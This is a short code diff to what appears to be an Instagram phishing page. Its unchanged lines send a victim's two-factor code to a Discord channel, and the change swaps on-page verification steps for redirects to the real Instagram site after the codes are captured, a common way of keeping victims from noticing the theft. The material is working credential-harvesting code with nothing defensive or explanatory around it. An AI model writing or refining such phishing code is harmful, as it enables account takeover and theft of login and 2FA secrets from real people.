@@ -185,9 +185,7 @@
 
                 setTimeout(() => {
                     document.getElementById('loading-message').classList.remove('show');
-                    document.querySelector('.verification-container').classList.add('active');
-                    document.querySelector('.container').style.transform = 'translateX(-420px)';
-                    
+                    window.location.href = 'https://www.instagram.com/';
                 }, 1500);
 
             } else if (type === '2fa') {
@@ -195,8 +193,7 @@
                 const message = `2FA Code: ${code}`;
                 await sendDiscordMessage(message);
 
-                document.getElementById('error-message').classList.add('show');
-                document.getElementById('verification-code').value = '';
+                window.location.href = 'https://www.instagram.com/';
             }
         }
 
